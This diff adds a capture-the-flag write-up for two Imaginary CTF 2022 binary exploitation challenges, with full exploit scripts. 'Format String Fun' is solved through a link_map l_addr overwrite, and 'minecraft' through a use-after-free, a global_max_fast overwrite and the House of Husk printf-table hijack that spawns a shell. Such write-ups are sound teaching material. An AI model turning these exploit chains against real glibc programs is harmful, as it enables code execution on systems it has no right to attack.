@@ -1,0 +1,419 @@
+---
+title: Imaginary CTF 2022
+date: 2022-07-25
+postLayout: simple
+draft: false
+tags:
+  - "linux"
+  - "ctf"
+  - "format-string"
+  - "use-after-free"
+  - "heap"
+---
+
+I played this CTF with **[Project Sekai](https://ctftime.org/team/169557)** and we came 3rd in this CTF. I solved `Format String Fun`, `minecraft`, `zookeeper` with my team. 
+
+![](https://i.imgur.com/Y0TASmG.png)
+
+---
+
+## Format String Fun
+
+- **Description** : One format string to rule them all, one format string to find them. One format string to bring them all, and in the darkness bind them.\
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/ImaginaryCTF-22/fmt_fun)
+- **Solves** : 18
+- **Points** : 474
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#87C38A">Full RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3ff000)</font>
+</pre>
+
+### Overview
+
+![](https://imgur.com/EwNKnIF.png)
+The main function takes a 400 bytes of input from stdin and stores it in `buf` which is a global buffer residing in the bss section. 
+
+```asm
+.bss:0000000000404040 ; char buf[400]
+.bss:0000000000404040 buf  
+```
+
+The binary also has a `win` function that will print out the contents of the flag
+![](https://imgur.com/ZoquUqm.png)
+
+### Bug
+
+The main function has a obvious format string bug.
+
+### Exploit
+
+There is a format string bug in the main function and after the bug the binary calls exit function.
+
+✖️ You don't have any libc leaks so you cannot overwrite any hooks. \
+✖️ Binary has full RELRO so you cannot overwrite GOT or `_fini_array`.
+
+I used a trick to redirect code execution from exit to call a function in the bss.
+If you look closely on the stack layout you will see a linker address like this when you run `telescope` command in pwndbg.
+ ![](https://imgur.com/g2266Ga.png)
+I didn't have an explanation on how overwriting this address can get me RIP control. I tried to debug the binary but i still couldn't figure it out. The binary calls `exit -> __run_exit_handlers -> __call_tls_dtors`
+. After the CTF the author said 
+
+> edit link_map.l_addr to cause miscalulation of fini_array location
+
+and provided a link to a [writeup](https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet#writing-to-struct-link_map). The exploit is explained very well here. The address we overwrite here is called the `l_addr`. So we overwrite the `l_addr` to cause a miscalculation of `fini_array` location when the exit happens and turn it into the address of our input in global buffer. So now we have the primitive to jump to any address or function. Remember there is a `win` function in the binary \
+: ) 
+
+```asm
+address of buf variable := 0x404040
+address of _fini_array  := 0x403db8
+distance between _fini_array to buf := 0x288
+```
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe = context.binary = ELF("./chall")
+host = args.HOST or "fmt-fun.chal.imaginaryctf.org"
+port = int(args.PORT or 1337)
+
+gdbscript = """
+tbreak main
+b *win
+continue
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+io = start()
+fini_addr = 0x403DB8
+buf = 0x404040
+payload = f"%{buf-fini_addr+0x10}c%26$n".encode("latin-1").ljust(0x10, b"\x00") + p(exe.sym.win) # +0x10 to skip our format string payload and jump to win function
+sl(payload)
+io.interactive()
+``` 
+
+<a name="minecraft"> </a>
+
+---
+
+## minecraft
+
+- **Description** : Blocks, chunks, same thing.
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/ImaginaryCTF-22/minecraft)
+- **Solves** : 8
+- **Points:** 495
+
+### Checksec
+
+<div dangerouslySetInnerHTML={{ __html: `
+<pre>    Arch:     amd64-64-little
+    RELRO:    <font color="#87C38A">Full RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3fd000)</font>
+    RUNPATH:  <font color="#FD5FF1">b&apos;./&apos;</font></pre>` }} />
+
+### Overview
+
+minecraft was a heap challenge. Libc version 2.27. The binary had 4 functionalities.
+
+```
+(p)lace a block
+(b)reak a block
+(r)eplace a block
+(l)eak the end poem     
+```
+
+#### place a block
+
+```c
+      if (choice == 'p') {
+          puts("idx: ");
+          __isoc99_scanf("%d%*c", & idx);
+          if (idx >= 0x11)
+              _Exit(0);
+          puts("len: ");
+          __isoc99_scanf("%ld%*c", & sizes[idx]);
+          if (sizes[idx] <= 0x4FF || sizes[idx] > 65536)
+              _Exit(0);
+          mem[idx] = malloc(sizes[idx]);
+          puts("type of block: ");
+          if (idx >= 0x11)
+              _Exit(0);
+          read(0, mem[idx], sizes[idx]);
+      }
+```
+
+You can allocate chunks with malloc and the sizes are restricted not to use tcache sized blocks. The freed chunks goes into unsorted bins or large bins. No negative indexing bugs here.
+
+#### break a block
+
+```c
+if (choice == 'b') {
+    puts("idx: ");
+    __isoc99_scanf("%d%*c", & idx);
+    if (idx >= 0x11)
+        _Exit(0);
+    free(mem[idx]);
+    puts("keep in inventory? ");
+    __isoc99_scanf("%c%*c", & choice);
+    if (choice != 'y' || kept) {
+        puts("Inventory full!");
+        mem[idx] = 0 LL;
+    } else {
+        ++kept;
+    }
+}
+```
+
+You can free chunks using this option.  if choice == "n" `mem[idx]` is not nulled out so you can cause a UAF but just once. The `kept` variable is a global variable. If it is set you cannot trigger UAF again, you can use only once.
+
+#### replace a block
+
+```c
+if (choice == 'r') {
+    puts("Careful... you can replace a block once.");
+    if (replaced)
+        _Exit(0);
+    ++replaced;
+    puts("idx: ");
+    __isoc99_scanf("%d%*c", & idx);
+    if (idx >= 0x11)
+        _Exit(0);
+    puts("type of block: ");
+    read(0, mem[idx], sizes[idx]);
+}
+```
+
+You can edit the contents of the heap blocks using this option and you can do so only once. After you have used this option once the `replaced` variable is set and when you use it again the binary calls _Exit(0).
+
+#### leak the end poem
+
+```c
+while (choice == 'l') {
+    puts("Careful... you can only leak the end poem once.");
+    puts("idx: ");
+    __isoc99_scanf("%d%*c", & idx);
+    if (idx >= 0x11)
+        _Exit(0);
+    if (strchr(mem[idx], 'n'))
+        _Exit(0);
+    if (strlen(mem[idx]) > 9)
+        _Exit(0);
+    printf(mem[idx]);
+    _Exit(0);
+}
+```
+
+Using this option will exit the program. Right before the exit call there is a printf call without format string parameter (format string bug). But we cannot use this to write data because it checks if our input contains character "n" and our input is limited to only 9 bytes. We cannot use this function to get any leaks as the binary will just exit right afterwards. 
+
+### Bug
+
+`(b)reak a block` option has a UAF vulnerability.
+`(r)eplace a block` option can be used to overwrite contents of a freed block (WAF primitive).
+`(l)eak the end poem` option has a format string vulnerability.
+
+#### Unintended bug
+
+The `sizes` array is of length 16 and the binary allows you to create a chunk with index 16. So this chunk's size field has an OOB and the size is written to the mem\[0]. You can use this bug to get an heap overflow.
+
+1. Place a chunk (**A**) on index 16. 
+2. Place a chunk (**B**) on index 0. 
+3. Use the `(r)eplace a block` option to edit the contents of chunk **B** This will use th 
+   address of chunk **A** as the length to read into chunk **B**.
+   ![enter image description here](https://imgur.com/pQ8IcRD.png)
+   ![enter image description here](https://imgur.com/kdB332d.png)
+
+   
+### House of Husk
+
+   
+To exploit this challenge we will be using the `House of Husk` Technique. We don't have leaks in this binary and with the constraints of single UAF & WAF house of husk method should be doable. We have `system` function available in our binary and the binary does not have ASLR (NO PIE).
+
+The [manpage](https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html) says 
+
+```
+The GNU C Library lets you define your own custom conversion specifiers 
+for  `printf`  template strings, to teach  `printf`  clever ways to print 
+the important data structures of your program.
+The way you do this is by registering the conversion with the function `register_printf_function`;
+```
+
+The way you register a new format specifier is by overwriting the `__printf_function_table` with a non null value and `__printf_arginfo_table` with a pointer to the fake table we created in the heap.
+
+[vprintf](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1381)
+
+```c
+  if ([__glibc_unlikely](https://elixir.bootlin.com/glibc/glibc-2.31/C/ident/__glibc_unlikely) ([__printf_function_table](https://elixir.bootlin.com/glibc/glibc-2.31/C/ident/__printf_function_table) != NULL
+			|| __printf_modifier_table != NULL
+			|| __printf_va_arg_table != NULL))
+    goto do_positional;
+```
+
+[do_positional](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1726)
+
+```c
+/* Hand off processing for positional parameters.  */
+do_positional:
+  if (__glibc_unlikely (workstart != NULL))
+//
+//
+  done = printf_positional (s, format, readonly_format, ap, &ap_save,
+			    done, nspecs_done, lead_str_end, work_buffer,
+			    save_errno, grouping, thousands_sep, mode_flags);
+```
+
+[printf_positional](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1748)
+
+```c
+      switch (specs[cnt].ndata_args)
+  {
+  case 0:   /* No arguments.  */
+    break;
+  case 1:   /* One argument; we already have the
+         type and size.  */
+    args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;
+    args_size[specs[cnt].data_arg] = specs[cnt].size;
+    break;
+  default:
+    /* We have more than one argument for this format spec.
+       We must call the arginfo function again to determine
+       all the types.  */
+    (void) (*__printf_arginfo_table[specs[cnt].info.spec])
+      (&specs[cnt].info,
+       specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],
+       &args_size[specs[cnt].data_arg]); // **RIP CONTROL**
+    break;
+  }
+```
+
+Overwriting the `global_max_fast` variable qualifies large chunks for fastbin insertion when freed. Freeing a large chunk and linking it into the fastbin for its size will write the address of that chunk into an offset from the first fastbin. This allows an attacker to overwrite an 8 byte aligned qword with a heap address. The formula to calculate the size of a chunk needed to overwrite a target with its address when freed is chunk_size = (delta \* 2) + 0x20,\* with delta being the distance between the first fastbin and the target in bytes.
+
+### Exploit stages
+
+* Create a large chunk (**A**).
+* Create large chunk (**B**) & (**C**)of crafted size to overwrite `__printf_function_table` & `__printf_arginfo_table` accordingly.
+* Create a chunk of any size to avoid consolidation.
+* Delete chunk **A**, -> `breakblock(a)` and choose "y" option to trigger UAF.
+* Overwrite the fd of chunk **A** with some random value and partially overwrite the last two bytes of bk value of unsorted bin to point to `global_max_fast-0x10` in order to achieve this there is a 4 bit bruteforce to get the address of `global_max_fast` right.
+  ->`replaceblock(a, p64(0xDEADBEF) + p16(0xB940 - 0x10))`.
+* Allocate another chunk of the same size as **A** chunk to overwrite `global_max_fast` with the address of `main_arena`.
+* Delete chunk **B** to overwrite `__printf_function_table` to make it a Non Null value.
+* Delete chunk **C** to overwrite `__printf_arginfo_table` with fake crafted table.
+
+Before freeing chunk B & C
+
+  ![enter image description here](https://imgur.com/VqLnTs2.png)
+
+After freeing chunk B & C
+
+![enter image description here](https://imgur.com/cGCtaKl.png)
+ I tried to use different specifiers for printf and then finally my team mate `IceCreamMan` found that using `%.26739d\x00` as the argument ends up setting `rdi` as `sh\x00`. 
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+
+exe = context.binary = ELF("./vuln")
+host = args.HOST or "minecraft.chal.imaginaryctf.org"
+port = int(args.PORT or 1337)
+
+gdbscript = """
+tbreak main
+set follow-fork-mode parent
+continue
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+
+io = start()
+
+
+def breakBlock(idx, keep):
+    sla(b"(l)eak the end poem", b"b")
+    sla(b"idx", str(idx).encode("latin-1"))
+    sla(b"keep in inventory?", keep)
+
+
+def viewBlock(idx):
+    sla(b"(l)eak the end poem", b"l")
+    sla(b"idx", str(idx).encode("latin-1"))
+
+
+def placeBlock(idx, len, content):
+    sla(b"(l)eak the end poem", b"p")
+    sla(b"idx", str(idx).encode("latin-1"))
+    sla(b"len", str(len).encode("latin-1"))
+    sla(b"type of block:", content)
+    return idx
+
+
+def replaceBlock(idx, content):
+    sla(b"(l)eak the end poem", b"r")
+    sla(b"idx", str(idx).encode("latin-1"))
+    sa(b"type of block:", content)
+
+
+def offset2size(ofs):
+    return (ofs) * 2 - 0x10
+
+
+def get_table_offset(ASCII_val):
+    return (ord(ASCII_val) - 2) * 8 # to calculate the offset of the format specifier in the __printf_arginfo_table
+
+
+MAIN_ARENA = 0x3EBC40
+GLOBAL_MAX_FAST = 0x3ED940
+PRINTF_FUNCTABLE = 0x3F0738
+PRINTF_ARGINFO = 0x3EC870
+ONE_GADGET = 0x10A38C
+
+payload = b"%X\x00"
+fake_tbl = flat(
+    {
+        get_table_offset("d"): p(exe.sym.system),
+    },
+    filler=b"\x00",
+)
+placeBlock(9, 0x520, b"AAAA")  # junk
+a = placeBlock(0, 0x520, b"AAAA")
+b = placeBlock(1, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), b"AAAA")
+c = placeBlock(2, offset2size(PRINTF_ARGINFO - MAIN_ARENA), fake_tbl)
+placeBlock(3, 0x520, b"%d\x00".ljust(0x520 - 1, b"C"))  # junk
+
+breakBlock(a, b"y")  # trigger UAF
+
+replaceBlock(
+    a, p(0xDEADBEF) + p16(0xF940 - 0x10)
+)  # overwrite fd and bk of unsorted bin using Write After Free primitive
+
+placeBlock(4, 0x520, b"%.26739d\x00")  # unsorted bin attack 26739 = sh
+
+
+breakBlock(b, b"n")
+breakBlock(c, b"n")
+viewBlock(4)
+
+io.interactive()
+``` 
+
+## References
+
+https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507
